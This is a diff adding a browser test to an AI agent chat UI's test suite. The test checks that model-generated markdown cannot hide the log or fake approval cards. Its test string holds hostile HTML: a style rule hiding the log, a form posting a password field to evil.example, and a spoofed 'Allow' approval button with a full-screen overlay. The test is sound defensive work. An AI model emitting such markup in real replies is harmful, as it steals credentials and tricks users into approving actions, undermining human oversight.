@@ -693,6 +693,26 @@ def test_find_refs_stay_unique_across_injections(page, server):
     assert page.evaluate("() => ctFind({ role: 'button', name: 'delete' }).matches[0].ref") == d, "an element keeps its ref"
 
 
+def test_model_markdown_cannot_style_or_fake_a_card(page, server):
+    """Model output renders next to the approval cards. It may not bring
+    <style>, forms, buttons or class/style/id with it; markdown still works."""
+    open_ui(page, server)
+    page.evaluate("""() => handle({ kind: 'text', text: 'Hi <style>#log{display:none}</style>'
+      + '<form action="https://evil.example/x" method="post"><input name="pw"><textarea>t</textarea><select><option>1</option></select>'
+      + '<button class="approve allow" id="approve" style="color:red" type="submit">Allow</button></form>'
+      + ' <span class="card approval" style="position:fixed;inset:0" id="x">covering</span>'
+      + '\\n\\n[a link](https://ok.example/) and `code`\\n\\n- one\\n- two\\n\\n| a | b |\\n|---|---|\\n| 1 | 2 |\\n\\n![pic](https://ok.example/i.png)' })""")
+    page.wait_for_selector("#log .msg.md table", timeout=SHORT)
+    html = page.evaluate("() => [...document.querySelectorAll('#log .msg.md')].at(-1).innerHTML")
+    for tag in ("<style", "<form", "<input", "<textarea", "<select", "<button"):
+        assert tag not in html, (tag, html)
+    for attr in (" class=", " style=", " id=", " action="):
+        assert attr not in html, (attr, html)
+    assert '<a href="https://ok.example/">a link</a>' in html and "<code>code</code>" in html, html
+    assert "<li>one</li>" in html and "<td>1</td>" in html and '<img src="https://ok.example/i.png" alt="pic">' in html, html
+    assert page.is_visible("#log"), "the reply could not hide the log"
+
+
 def test_reply_tables_have_lines(page, server):
     open_ui(page, server)
     page.evaluate("() => handle({ kind: 'text', text: '| txn | € |\\n|---|---|\\n| T1052 | 171,24 |\\n| T1095 | 53,84 |' })")
